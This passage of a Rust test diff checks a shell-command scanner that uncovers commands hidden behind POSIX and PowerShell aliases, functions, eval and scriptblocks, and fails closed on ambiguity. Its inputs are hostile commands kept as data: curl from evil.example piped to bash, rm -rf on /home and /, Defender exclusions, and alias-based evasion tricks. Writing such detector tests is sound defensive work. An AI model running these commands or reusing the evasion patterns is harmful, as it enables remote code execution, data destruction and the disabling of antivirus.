+    fn dynamic_secondary_command_consumers_fail_closed() {
+        for (input, shell) in [
+            ("xargs -I{} {} -rf /", ShellType::Posix),
+            ("find . -exec $COMMAND {} \\;", ShellType::Posix),
+            ("exec \"$COMMAND\" -rf /", ShellType::Posix),
+            ("command $COMMAND -rf /", ShellType::Posix),
+            ("nohup ${COMMAND} -rf /", ShellType::Posix),
+            ("call %COMMAND%", ShellType::Cmd),
+            ("start \"\" %COMMAND%", ShellType::Cmd),
+        ] {
+            let scan = executable_substitution_scan(input, shell);
+            assert!(scan.gap.is_some(), "{input:?} -> {scan:?}");
+        }
+    }
+
+    #[test]
+    fn powershell_functions_and_switch_actions_are_executable_bodies() {
+        for input in [
+            "function Evil { Add-MpPreference -ExclusionPath C:\\Temp }; Evil",
+            "filter Evil { Add-MpPreference -ExclusionPath C:\\Temp }; Evil",
+            "switch (1) { 1 { Add-MpPreference -ExclusionPath C:\\Temp } }",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::PowerShell);
+            assert!(
+                scan.bodies
+                    .iter()
+                    .any(|body| body.input.contains("Add-MpPreference")),
+                "{input:?} -> {scan:?}"
+            );
+        }
+
+        let dormant = executable_substitution_scan(
+            "function Evil { Add-MpPreference -ExclusionPath C:\\Temp }",
+            ShellType::PowerShell,
+        );
+        assert!(dormant.bodies.is_empty(), "{dormant:?}");
+        assert!(dormant.gap.is_none(), "{dormant:?}");
+
+        let direct = executable_substitution_scan(
+            "function Evil { Add-MpPreference -ExclusionPath C:\\Temp }; Evil",
+            ShellType::PowerShell,
+        );
+        assert!(direct.gap.is_none(), "{direct:?}");
+    }
+
+    #[test]
+    fn powershell_invoked_function_named_blocks_are_recovered_only_in_function_context() {
+        for (keyword, invocation) in [
+            ("dynamicparam", "Evil"),
+            ("begin", "Evil"),
+            ("process", "1 | Evil"),
+            ("end", "Evil"),
+            ("clean", "Evil"),
+        ] {
+            let input = format!(
+                "function Evil {{ {keyword} {{ Add-MpPreference -ExclusionPath C:\\Temp }} }}; {invocation}"
+            );
+            let scan = executable_substitution_scan(&input, ShellType::PowerShell);
+            assert!(
+                scan.bodies
+                    .iter()
+                    .any(|body| body.input.trim_start().starts_with("Add-MpPreference")),
+                "invoked named block stayed dormant: {input:?} -> {scan:?}"
+            );
+        }
+
+        for input in [
+            "function Evil { begin { Add-MpPreference -ExclusionPath C:\\Temp } }",
+            "$block = { process { Add-MpPreference -ExclusionPath C:\\Temp } }",
+            "Write-Output '{ clean { Add-MpPreference -ExclusionPath C:\\Temp } }'",
+            "begin { Add-MpPreference -ExclusionPath C:\\Temp }",
+        ] {
+            let dormant = executable_substitution_scan(input, ShellType::PowerShell);
+            assert!(
+                dormant.bodies.is_empty(),
+                "dormant body ran: {input:?} -> {dormant:?}"
+            );
+            assert!(
+                dormant.gap.is_none(),
+                "dormant body became a gap: {input:?} -> {dormant:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn powershell_hashtable_expressions_execute_but_scriptblock_values_stay_dormant() {
+        for input in [
+            "$h = @{ payload = $(Add-MpPreference -ExclusionPath C:\\Temp) }",
+            "$h = [ordered]@{ payload = \"$(Add-MpPreference -ExclusionPath C:\\Temp)\" }",
+            "$h = @{ nested = @{ payload = $(Add-MpPreference -ExclusionPath C:\\Temp) } }",
+            "$h = @{ $(Write-Output key) = $(Add-MpPreference -ExclusionPath C:\\Temp) }",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::PowerShell);
+            assert!(
+                scan.bodies
+                    .iter()
+                    .any(|body| body.input.contains("Add-MpPreference")),
+                "active hashtable expression was not recovered: {input:?} -> {scan:?}"
+            );
+            assert!(
+                scan.gap.is_none(),
+                "complete hashtable became a gap: {input:?} -> {scan:?}"
+            );
+        }
+
+        for input in [
+            "$h = @{}",
+            "$h = @{ payload = { Add-MpPreference -ExclusionPath C:\\Temp } }",
+            "$h = @{ ForEach-Object = { Add-MpPreference -ExclusionPath C:\\Temp } }",
+            "$h = @{ begin = { Add-MpPreference -ExclusionPath C:\\Temp } }",
+            "$h = @{ payload = '$(Add-MpPreference -ExclusionPath C:\\Temp)' }",
+            "$block = { @{ payload = $(Add-MpPreference -ExclusionPath C:\\Temp) } }",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::PowerShell);
+            assert!(
+                scan.bodies.is_empty(),
+                "dormant hashtable value ran: {input:?} -> {scan:?}"
+            );
+            assert!(
+                scan.gap.is_none(),
+                "dormant hashtable value became a gap: {input:?} -> {scan:?}"
+            );
+        }
+
+        for input in [
+            "$h = @{ payload = $(Add-MpPreference -ExclusionPath C:\\Temp)",
+            "$h = @{ nested = @{ payload = $(Add-MpPreference -ExclusionPath C:\\Temp) }",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::PowerShell);
+            assert!(
+                scan.bodies
+                    .iter()
+                    .any(|body| body.input.contains("Add-MpPreference")),
+                "recoverable incomplete expression was lost: {input:?} -> {scan:?}"
+            );
+            assert_eq!(
+                scan.gap,
+                Some(ShellExecutionGap::IncompletePowerShellInvocation),
+                "incomplete hashtable did not fail closed: {input:?} -> {scan:?}"
+            );
+        }
+
+        let mut depth_exhausted =
+            "$h = @{ payload = $(Add-MpPreference -ExclusionPath C:\\Temp); nested = ".to_string();
+        for _ in 0..=MAX_SHELL_DELIMITER_DEPTH {
+            depth_exhausted.push_str("@{ nested = ");
+        }
+        let scan = executable_substitution_scan(&depth_exhausted, ShellType::PowerShell);
+        assert!(
+            scan.bodies
+                .iter()
+                .any(|body| body.input.contains("Add-MpPreference")),
+            "shallow executable prefix was lost at the hashtable depth bound: {scan:?}"
+        );
+        assert_eq!(
+            scan.gap,
+            Some(ShellExecutionGap::IncompletePowerShellInvocation),
+            "depth-exhausted hashtable did not fail closed: {scan:?}"
+        );
+    }
+
+    #[test]
+    fn powershell_dispatch_state_crossing_recovered_bodies_fails_closed() {
+        for input in [
+            "function Evil { Add-MpPreference -ExclusionPath C:\\Temp }; if ($true) { Evil }",
+            "function Evil { Add-MpPreference -ExclusionPath C:\\Temp }; & { Evil }",
+            "function Evil { Add-MpPreference -ExclusionPath C:\\Temp }; . { Evil }",
+            "function Sink { Add-MpPreference -ExclusionPath C:\\Temp }; function Wrapper { Sink }; Wrapper",
+            "if ($true) { function Evil { Add-MpPreference -ExclusionPath C:\\Temp } }; Evil",
+            "function Evil { Write-Output safe }; if ($true) { function Evil { Add-MpPreference -ExclusionPath C:\\Temp } }; Evil",
+            "if ($true) { Set-Alias Evil Add-MpPreference }; Evil -ExclusionPath C:\\Temp",
+            "$Function:Evil = { Add-MpPreference -ExclusionPath C:\\Temp }; Evil",
+            "$Alias:Evil = 'Invoke-Expression'; Evil 'Add-MpPreference -ExclusionPath C:\\Temp'",
+            "if ($true) { $Function:Evil = { Add-MpPreference -ExclusionPath C:\\Temp } }; Evil",
+            "Set-Location Function:; New-Item Evil -Value { Add-MpPreference -ExclusionPath C:\\Temp }; Evil",
+            "function Evil { Add-MpPreference -ExclusionPath C:\\Temp }; iex 'Evil'",
+            "iex 'function Evil { Add-MpPreference -ExclusionPath C:\\Temp }'; Evil",
+            "function Wrapper { Set-Content Function:global:Evil { Add-MpPreference -ExclusionPath C:\\Temp } }; Wrapper; Evil",
+            "function Wrapper { sc Function:script:Evil { Add-MpPreference -ExclusionPath C:\\Temp } }; Wrapper; Evil",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::PowerShell);
+            assert_eq!(
+                scan.gap,
+                Some(ShellExecutionGap::AmbiguousExecutableBody),
+                "{input:?} -> {scan:?}"
+            );
+        }
+
+        let unrelated_control = executable_substitution_scan(
+            "function Evil { Add-MpPreference -ExclusionPath C:\\Temp }; if ($true) { Write-Output safe }",
+            ShellType::PowerShell,
+        );
+        assert!(unrelated_control.gap.is_none(), "{unrelated_control:?}");
+
+        let dormant = executable_substitution_scan(
+            "function Evil { Add-MpPreference -ExclusionPath C:\\Temp }",
+            ShellType::PowerShell,
+        );
+        assert!(dormant.gap.is_none(), "{dormant:?}");
+        assert!(dormant.bodies.is_empty(), "{dormant:?}");
+
+        let quoted_reference = executable_substitution_scan(
+            "function Evil { Write-Output 'Evil' }; Evil",
+            ShellType::PowerShell,
+        );
+        assert!(quoted_reference.gap.is_none(), "{quoted_reference:?}");
+
+        let inert_iex =
+            executable_substitution_scan("iex 'Write-Output safe'", ShellType::PowerShell);
+        assert!(inert_iex.gap.is_none(), "{inert_iex:?}");
+
+        for control in [
+            "function Helper { Write-Output safe }; iex 'Write-Output safe'",
+            "iex 'Write-Output safe'; function Helper { Write-Output safe }",
+            "function Helper { Write-Output safe }; pwsh -Command 'Write-Output safe'",
+            "& { function Local { Write-Output safe }; Local }; Write-Output safe",
+        ] {
+            let scan = executable_substitution_scan(control, ShellType::PowerShell);
+            assert!(scan.gap.is_none(), "{control:?} -> {scan:?}");
+        }
+
+        let filesystem_provider = executable_substitution_scan(
+            "Set-Location C:\\Temp; New-Item report.txt -Value safe",
+            ShellType::PowerShell,
+        );
+        assert!(filesystem_provider.gap.is_none(), "{filesystem_provider:?}");
+
+        for input in [
+            "function Wrapper { Set-Item Env:NOTE 'Function:global:Evil' }; Wrapper",
+            "function Wrapper { Set-Content Env:NOTE 'Function:global:Evil' }; Wrapper",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::PowerShell);
+            assert!(scan.gap.is_none(), "{input:?} -> {scan:?}");
+        }
+
+        let child_local_function = executable_substitution_scan(
+            "function Wrapper { function Local { Write-Output safe }; Local }; Wrapper",
+            ShellType::PowerShell,
+        );
+        assert!(
+            child_local_function.gap.is_none(),
+            "{child_local_function:?}"
+        );
+
+        let child_global_function = executable_substitution_scan(
+            "function Wrapper { function global:Evil { Write-Output unsafe } }; Wrapper",
+            ShellType::PowerShell,
+        );
+        assert_eq!(
+            child_global_function.gap,
+            Some(ShellExecutionGap::AmbiguousExecutableBody),
+            "{child_global_function:?}"
+        );
+
+        for input in [
+            "function Wrapper { function    global:Evil { Write-Output unsafe } }; Wrapper; Evil",
+            "function Wrapper { filter\tScript:Evil { Write-Output unsafe } }; Wrapper; Evil",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::PowerShell);
+            assert_eq!(
+                scan.gap,
+                Some(ShellExecutionGap::AmbiguousExecutableBody),
+                "{input:?} -> {scan:?}"
+            );
+        }
+
+        for input in [
+            "function Wrapper { function Local { Write-Output 'function global:' } }; Wrapper",
+            "function Wrapper { filter Local { Write-Output 'alias:script:' } }; Wrapper",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::PowerShell);
+            assert!(scan.gap.is_none(), "{input:?} -> {scan:?}");
+        }
+    }
+
+    #[test]
+    fn powershell_dispatch_join_audit_handles_literal_call_forms_and_controls() {
+        let functions = vec![PowerShellFunctionDefinition {
+            name: "evil".to_string(),
+            body: "Write-Output dangerous".to_string(),
+            explicit_parent_scope: false,
+        }];
+        let aliases = std::collections::HashMap::from([(
+            "badalias".to_string(),
+            "Write-Output dangerous".to_string(),
+        )]);
+        let unresolved_aliases = std::collections::HashSet::from(["unknownalias".to_string()]);
+
+        for body in [
+            "Evil",
+            "& Evil",
+            ". Evil",
+            "if ($true) { Evil }",
+            "BadAlias",
+            "UnknownAlias",
+            "function Nested { Write-Output dangerous }",
+            "Set-Item Function:Nested { Write-Output dangerous }",
+            "Set-Content Function:global:Nested { Write-Output dangerous }",
+            "Set-Alias Nested Write-Output",
+        ] {
+            let mut remaining = MAX_POWERSHELL_DISPATCH_JOIN_BODIES;
+            assert!(
+                powershell_body_crosses_dispatch_state(
+                    body,
+                    &functions,
+                    &aliases,
+                    &unresolved_aliases,
+                    true,
+                    true,
+                    0,
+                    &mut remaining,
+                ),
+                "dispatch join stayed open for {body:?}"
+            );
+        }
+
+        for body in ["Write-Output safe", "Write-Output 'Evil BadAlias'"] {
+            let mut remaining = MAX_POWERSHELL_DISPATCH_JOIN_BODIES;
+            assert!(
+                !powershell_body_crosses_dispatch_state(
+                    body,
+                    &functions,
+                    &aliases,
+                    &unresolved_aliases,
+                    true,
+                    true,
+                    0,
+                    &mut remaining,
+                ),
+                "literal control became an ambiguous dispatch join: {body:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn literal_alias_rebinding_recovers_the_invoked_body() {
+        for (input, shell, expected, expected_gap) in [
+            (
+                "alias evil='rm -rf /home'\nevil",
+                ShellType::Posix,
+                "rm -rf /home",
+                None,
+            ),
+            (
+                "Set-Alias evil Add-MpPreference; evil -ExclusionPath C:\\Temp",
+                ShellType::PowerShell,
+                "Add-MpPreference -ExclusionPath",
+                Some(ShellExecutionGap::AmbiguousExecutableBody),
+            ),
+            (
+                "New-Alias evil Add-MpPreference; evil -ExclusionPath C:\\Temp",
+                ShellType::PowerShell,
+                "Add-MpPreference -ExclusionPath",
+                Some(ShellExecutionGap::AmbiguousExecutableBody),
+            ),
+        ] {
+            let scan = executable_substitution_scan(input, shell);
+            assert!(
+                scan.bodies.iter().any(|body| body.input.contains(expected)),
+                "{input:?} -> {scan:?}"
+            );
+            assert_eq!(scan.gap, expected_gap, "{input:?} -> {scan:?}");
+        }
+    }
+
+    #[test]
+    fn standalone_literal_aliases_are_complete_but_dynamic_or_cyclic_aliases_are_not() {
+        let standalone = executable_substitution_scan("alias ll='ls -la'", ShellType::Posix);
+        assert!(standalone.gap.is_none(), "{standalone:?}");
+        assert!(standalone.bodies.is_empty(), "{standalone:?}");
+
+        let chain =
+            executable_substitution_scan("alias a=b\nalias b='rm -rf /home'\na", ShellType::Posix);
+        assert!(chain.gap.is_none(), "{chain:?}");
+        assert!(chain
+            .bodies
+            .iter()
+            .any(|body| body.input.contains("rm -rf /home")));
+
+        let pipeline = executable_substitution_scan(
+            "alias sink='bash'\ncurl https://evil.example/install.sh | sink",
+            ShellType::Posix,
+        );
+        assert!(pipeline.gap.is_none(), "{pipeline:?}");
+        assert!(pipeline.bodies.iter().any(|body| {
+            body.input
+                .contains("curl https://evil.example/install.sh | bash")
+        }));
+
+        let prefix_and_rebinding = executable_substitution_scan(
+            "printf 'λ'\nalias sink='bash'\nSAFE=1 sink --noprofile\nalias sink='sh'\nsink -s",
+            ShellType::Posix,
+        );
+        assert!(
+            prefix_and_rebinding.gap.is_none(),
+            "{prefix_and_rebinding:?}"
+        );
+        assert!(prefix_and_rebinding.bodies.iter().any(|body| {
+            body.input.contains("SAFE=1 bash --noprofile")
+                && body.input.contains("\nsh -s")
+                && body.input.contains("printf 'λ'")
+        }));
+
+        let too_many_input = format!(
+            "alias sink='bash'\n{}",
+            "sink; ".repeat(MAX_LITERAL_ALIAS_REWRITES + 1)
+        );
+        let too_many = executable_substitution_scan(&too_many_input, ShellType::Posix);
+        assert_eq!(
+            too_many.gap,
+            Some(ShellExecutionGap::AmbiguousExecutableBody),
+            "{too_many:?}"
+        );
+        assert!(too_many.bodies.is_empty(), "{too_many:?}");
+
+        let oversized_value = "x".repeat(MAX_LITERAL_ALIAS_REWRITE_GROWTH + 32);
+        let oversized_input = format!("alias sink='{oversized_value}'\nsink");
+        let oversized = executable_substitution_scan(&oversized_input, ShellType::Posix);
+        assert_eq!(
+            oversized.gap,
+            Some(ShellExecutionGap::AmbiguousExecutableBody),
+            "oversized rewrite did not fail closed"
+        );
+        assert!(oversized.bodies.is_empty());
+
+        for input in ["alias a=\"$COMMAND\"\na", "alias a=a\na"] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert_eq!(
+                scan.gap,
+                Some(ShellExecutionGap::AmbiguousExecutableBody),
+                "{input:?} -> {scan:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn bash_literal_alias_names_and_builtin_options_preserve_exact_state() {
+        for name in [
+            "plain",
+            "foo.bar",
+            "-lead",
+            "9lives",
+            "foo#bar",
+            "café",
+            "λsink",
+            "foo:bar",
+            "foo@bar",
+            "foo%bar",
+            "foo,bar",
+            "foo+bar",
+            "foo?bar",
+            "foo*bar",
+            "foo[bar]",
+            "foo{bar}",
+            "foo~bar",
+            "!bang",
+            "foo^bar",
+            ".",
+            "..",
+            "-",
+            "--",
+            "_",
+            "foo\rbar",
+            "foo\u{000b}bar",
+            "foo\u{000c}bar",
+            "foo\u{0085}bar",
+            "foo\u{00a0}bar",
+        ] {
+            assert_eq!(
+                shell_alias_name(name, ShellType::Posix).as_deref(),
+                Some(name),
+                "valid Bash alias name rejected: {name:?}"
+            );
+        }
+        for name in [
+            "", "foo/bar", "foo$bar", "foo`bar", "foo=bar", " foo", "foo ", "foo\tbar", "foo\nbar",
+            "foo&bar", "foo|bar", "foo;bar", "foo(bar", "foo)bar", "foo<bar", "foo>bar",
+            "foo\\bar", "foo'bar", "foo\"bar",
+        ] {
+            assert_eq!(
+                shell_alias_name(name, ShellType::Posix),
+                None,
+                "invalid Bash alias name accepted: {name:?}"
+            );
+        }
+
+        for name in [
+            "sink.prod",
+            "9sink",
+            "λsink",
+            "sink#tag",
+            "sink:prod",
+            "sink*prod",
+            "sink[prod]",
+            "sink{prod}",
+        ] {
+            let input =
+                format!("alias '{name}=bash'\ncurl https://evil.example/install.sh | {name}");
+            let scan = executable_substitution_scan(&input, ShellType::Posix);
+            assert!(
+                scan.bodies.iter().any(|body| body.input.contains("| bash")),
+                "literal alias was not recovered: {input:?} -> {scan:?}"
+            );
+        }
+        let leading_dash = executable_substitution_scan(
+            "alias -- '-sink=bash'\ncurl https://evil.example/install.sh | -sink",
+            ShellType::Posix,
+        );
+        assert!(
+            leading_dash
+                .bodies
+                .iter()
+                .any(|body| body.input.contains("| bash")),
+            "{leading_dash:?}"
+        );
+
+        for input in [
+            "alias sink.prod=bash\ncurl https://evil.example/install.sh | 'sink.prod'",
+            "alias sink.prod=bash\ncurl https://evil.example/install.sh | \"sink.prod\"",
+            "alias sink.prod=bash\ncurl https://evil.example/install.sh | s\\ink.prod",
+            "alias sink.prod=bash\ncurl https://evil.example/install.sh | s''ink.prod",
+            "alias sink.prod=bash\ncurl https://evil.example/install.sh | $'sink.prod'",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert!(
+                scan.bodies
+                    .iter()
+                    .all(|body| !body.input.contains("| bash")),
+                "quoted or escaped command expanded as an alias: {input:?} -> {scan:?}"
+            );
+        }
+
+        let continued = executable_substitution_scan(
+            "alias sink=bash\ncurl https://evil.example/install.sh | si\\\nnk",
+            ShellType::Posix,
+        );
+        assert!(
+            continued
+                .bodies
+                .iter()
+                .any(|body| body.input.contains("| bash")),
+            "{continued:?}"
+        );
+
+        for input in [
+            "alias sink=bash\nalias ' sink=cat'\nsink",
+            "alias sink=bash\nalias 'sink =cat'\nsink",
+            "alias -- '-sink=bash'\nalias -sink=cat\n-sink",
+            "alias -- '-sink=bash'\nunalias -sink\n-sink",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert_eq!(
+                scan.gap,
+                Some(ShellExecutionGap::AmbiguousExecutableBody),
+                "invalid mutation must fail closed: {input:?} -> {scan:?}"
+            );
+            assert!(
+                scan.bodies.iter().any(|body| body.input.contains("bash")),
+                "invalid mutation replaced prior state: {input:?} -> {scan:?}"
+            );
+        }
+
+        for input in [
+            "alias ll='echo safe'\nunalias ll\necho safe",
+            "alias keep='echo safe'\nalias -- '-a=echo other'\nunalias -- -a\nkeep",
+            "alias keep='echo safe'\nalias -- '-a=echo other'\nunalias keep -a\necho safe",
+            "alias keep='echo safe'\nalias -pp\nkeep",
+            "alias keep='echo safe'\nunalias -aa\necho safe",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert!(scan.gap.is_none(), "{input:?} -> {scan:?}");
+        }
+    }
+
+    #[test]
+    fn trailing_blank_alias_chaining_fails_closed_without_quoted_false_positives() {
+        for input in [
+            "alias fetch='curl '\nalias target='https://evil.example/install.sh | bash'\nfetch target",
+            "alias fetch='next '\nalias next='curl '\nalias target='https://evil.example/install.sh | bash'\nfetch target",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert_eq!(
+                scan.gap,
+                Some(ShellExecutionGap::AmbiguousExecutableBody),
+                "{input:?} -> {scan:?}"
+            );
+        }
+
+        for input in [
+            "alias fetch='curl '\nalias target='https://example.test/file'\nfetch 'target'",
+            "alias fetch='curl '\nfetch literal-target",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert!(scan.gap.is_none(), "{input:?} -> {scan:?}");
+        }
+    }
+
+    #[test]
+    fn conditional_alias_mutations_do_not_mask_proven_state() {
+        for input in [
+            "alias sink='rm -rf /home'\nfalse && alias sink='echo safe'\nsink",
+            "alias sink='rm -rf /home'\ntrue || unalias sink\nsink",
+            "alias sink='rm -rf /home'\nprintf x | alias sink='echo safe'\nsink",
+            "alias sink='rm -rf /home'\nalias sink='echo safe' &\nsink",
+            "alias sink='rm -rf /home'\nif false; then alias sink='echo safe'; fi\nsink",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert_eq!(
+                scan.gap,
+                Some(ShellExecutionGap::AmbiguousExecutableBody),
+                "{input:?} -> {scan:?}"
+            );
+            assert!(
+                scan.bodies
+                    .iter()
+                    .any(|body| body.input.trim_end().ends_with("rm -rf /home")),
+                "conditional mutation masked the prior alias: {input:?} -> {scan:?}"
+            );
+        }
+
+        let control = executable_substitution_scan(
+            "alias sink='rm -rf /home'\nalias sink='echo safe'\nsink",
+            ShellType::Posix,
+        );
+        assert!(control.gap.is_none(), "{control:?}");
+        assert!(control
+            .bodies
+            .iter()
+            .any(|body| body.input.trim_end().ends_with("echo safe")));
+        assert!(control
+            .bodies
+            .iter()
+            .all(|body| !body.input.trim_end().ends_with("rm -rf /home")));
+    }
+
+    #[test]
+    fn same_parse_line_alias_rebind_uses_the_pre_execution_state() {
+        let rebound = executable_substitution_scan(
+            "alias sink='bash'\nalias sink='cat'; curl https://evil.example/install.sh | sink",
+            ShellType::Posix,
+        );
+        assert!(rebound.gap.is_none(), "{rebound:?}");
+        assert!(rebound.bodies.iter().any(|body| {
+            body.input
+                .contains("curl https://evil.example/install.sh | bash")
+        }));
+
+        let removed = executable_substitution_scan(
+            "alias sink='bash'\nunalias sink; curl https://evil.example/install.sh | sink",
+            ShellType::Posix,
+        );
+        assert!(removed.gap.is_none(), "{removed:?}");
+        assert!(removed.bodies.iter().any(|body| {
+            body.input
+                .contains("curl https://evil.example/install.sh | bash")
+        }));
+    }
+
+    #[test]
+    fn conditional_function_redefinition_and_dispatch_state_joins_fail_closed() {
+        let conditional = executable_substitution_scan(
+            "sink(){ rm -rf /home; }\nfalse && sink(){ echo safe; }\nsink",
+            ShellType::Posix,
+        );
+        assert_eq!(
+            conditional.gap,
+            Some(ShellExecutionGap::AmbiguousExecutableBody),
+            "{conditional:?}"
+        );
+        assert!(conditional
+            .bodies
+            .iter()
+            .any(|body| body.input.contains("rm -rf /home")));
+
+        for input in [
+            "alias sink='bash'\n(curl https://evil.example/install.sh | sink)",
+            "sink(){ bash; }\nfetch(){ curl https://evil.example/install.sh | sink; }\nfetch",
+            "sink(){ bash; }\neval 'curl https://evil.example/install.sh | sink'",
+            "{ alias sink='bash'; }\ncurl https://evil.example/install.sh | sink",
+            "mutate(){ alias sink='bash'; }\nmutate\ncurl https://evil.example/install.sh | sink",
+            "alias sink='echo safe'\neval '\\alias sink=\"bash\"'\ncurl https://evil.example/install.sh | sink",
+            "alias sink='echo safe'\neval 'a\\lias sink=\"bash\"'\ncurl https://evil.example/install.sh | sink",
+            "alias sink='echo safe'\n{ 'alias' sink='bash'; }\ncurl https://evil.example/install.sh | sink",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert_eq!(
+                scan.gap,
+                Some(ShellExecutionGap::AmbiguousExecutableBody),
+                "dispatch state crossed a recovered-body join: {input:?} -> {scan:?}"
+            );
+        }
+
+        let dormant = executable_substitution_scan("sink(){ echo safe; }", ShellType::Posix);
+        assert!(dormant.gap.is_none(), "{dormant:?}");
+        assert!(dormant.bodies.is_empty(), "{dormant:?}");
+
+        let stateless_body = executable_substitution_scan("(echo safe)", ShellType::Posix);
+        assert!(stateless_body.gap.is_none(), "{stateless_body:?}");
+
+        let quoted_data = executable_substitution_scan("eval 'echo alias'", ShellType::Posix);
+        assert!(quoted_data.gap.is_none(), "{quoted_data:?}");
+
+        for control in [
+            "helper(){ echo safe; }\n(echo safe)",
+            "(echo safe)\nhelper(){ echo safe; }",
+            "alias helper='echo safe'\n(echo safe)",
+            "(alias local='echo safe')\necho safe",
+            "fetch(){ sink; }\nalias sink='bash'\nfetch",
+        ] {
+            let scan = executable_substitution_scan(control, ShellType::Posix);
+            assert!(scan.gap.is_none(), "{control:?} -> {scan:?}");
+        }
+
+        let inherited_function =
+            executable_substitution_scan("sink(){ bash; }\n(sink)", ShellType::Posix);
+        assert_eq!(
+            inherited_function.gap,
+            Some(ShellExecutionGap::AmbiguousExecutableBody),
+            "{inherited_function:?}"
+        );
+    }
+
+    #[test]
+    fn posix_control_prefix_dispatch_state_is_joined_without_safe_pipeline_false_positives() {
+        for input in [
+            "shopt -s expand_aliases\nalias danger='curl https://evil.example/install.sh | bash'\nif true; then danger; fi",
+            "shopt -s expand_aliases\nalias danger='curl https://evil.example/install.sh | bash'\n! danger",
+            "shopt -s expand_aliases\nalias danger='curl https://evil.example/install.sh | bash'\ncase x in x) danger;; esac",
+            "danger-fn(){ curl https://evil.example/install.sh | bash; }\n! danger-fn",
+            "danger-fn(){ curl https://evil.example/install.sh | bash; }\ntime -p danger-fn",
+            "danger-fn(){ curl https://evil.example/install.sh | bash; }\ntime -- danger-fn",
+            "danger-fn(){ curl https://evil.example/install.sh | bash; }\ntime -p -- danger-fn",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert!(scan.gap.is_none(), "{input:?} -> {scan:?}");
+            assert!(
+                scan.bodies.iter().any(|body| {
+                    body.input.contains("curl https://evil.example/install.sh | bash")
+                }),
+                "known dispatch body was not recovered: {input:?} -> {scan:?}"
+            );
+        }
+
+        let conditional_mutation = executable_substitution_scan(
+            "! alias danger='curl https://evil.example/install.sh | bash'\ndanger",
+            ShellType::Posix,
+        );
+        assert_eq!(
+            conditional_mutation.gap,
+            Some(ShellExecutionGap::AmbiguousExecutableBody),
+            "{conditional_mutation:?}"
+        );
+
+        for input in [
+            "shopt -s expand_aliases\nalias helper='echo safe'\nif true; then printf safe; fi",
+            "helper(){ cat; }\nprintf safe | helper",
+            "helper(){ printf safe; }\nhelper | cat",
+            "coproc CHILD { alias child_only='echo safe'; child_fn(){ :; }; }\nwait \"$CHILD_PID\"",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert!(scan.gap.is_none(), "{input:?} -> {scan:?}");
+        }
+
+        for input in [
+            "helper(){ bash; }\nprintf safe | helper",
+            "helper(){ . /dev/fd/0; }\nprintf 'echo unsafe' | helper",
+            "helper(){ printf 'echo unsafe'; }\nhelper | bash",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert_eq!(
+                scan.gap,
+                Some(ShellExecutionGap::AmbiguousExecutableBody),
+                "{input:?} -> {scan:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn quoted_or_escaped_posix_control_words_do_not_execute_following_functions() {
+        for leader in ["'if'", "\"then\"", "\\!", "'time'"] {
+            let input = format!("danger-fn(){{ rm -rf /home; }}\n{leader} danger-fn");
+            let scan = executable_substitution_scan(&input, ShellType::Posix);
+            assert!(scan.gap.is_none(), "{input:?} -> {scan:?}");
+            assert!(
+                scan.bodies
+                    .iter()
+                    .all(|body| !body.input.contains("rm -rf /home")),
+                "non-reserved spelling executed a following function: {input:?} -> {scan:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn alias_mutation_surfaces_fail_closed_across_wrappers_and_providers() {
+        for input in [
+            "builtin alias a='rm -rf /home'\na",
+            "command alias a='rm -rf /home'\na",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert!(scan.gap.is_none(), "{input:?} -> {scan:?}");
+            assert!(
+                scan.bodies
+                    .iter()
+                    .any(|body| body.input.contains("rm -rf /home")),
+                "{input:?} -> {scan:?}"
+            );
+        }
+
+        for (input, shell) in [
+            ("alias evil 'rm -rf /home'\nevil", ShellType::Fish),
+            (
+                "Set-Alias a b; Set-Alias b Add-MpPreference; a -ExclusionPath C:\\Temp",
+                ShellType::PowerShell,
+            ),
+            (
+                "Set-Item Alias:foo Add-MpPreference; foo -ExclusionPath C:\\Temp",
+                ShellType::PowerShell,
+            ),
+            (
+                "New-Item -Path Alias:foo -Value Add-MpPreference; foo -ExclusionPath C:\\Temp",
+                ShellType::PowerShell,
+            ),
+            ("Import-Alias .\\aliases.csv", ShellType::PowerShell),
+            (
+                "si Alias:foo Add-MpPreference; foo -ExclusionPath C:\\Temp",
+                ShellType::PowerShell,
+            ),
+            ("ri Alias:foo", ShellType::PowerShell),
+            (
+                "cp Alias:iex Alias:foo; foo 'Add-MpPreference -ExclusionPath C:\\Temp'",
+                ShellType::PowerShell,
+            ),
+            (
+                "& Set-Alias foo Add-MpPreference; foo -ExclusionPath C:\\Temp",
+                ShellType::PowerShell,
+            ),
+            (
+                "& Set-Item Alias:foo Add-MpPreference; foo -ExclusionPath C:\\Temp",
+                ShellType::PowerShell,
+            ),
+        ] {
+            let scan = executable_substitution_scan(input, shell);
+            assert_eq!(
+                scan.gap,
+                Some(ShellExecutionGap::AmbiguousExecutableBody),
+                "{input:?} -> {scan:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn powershell_collection_intrinsic_scriptblocks_are_recovered_exactly() {
+        for (input, expected) in [
+            (
+                "$items.ForEach({ Add-MpPreference -ExclusionPath C:\\Temp })",
+                "Add-MpPreference -ExclusionPath C:\\Temp",
+            ),
+            (
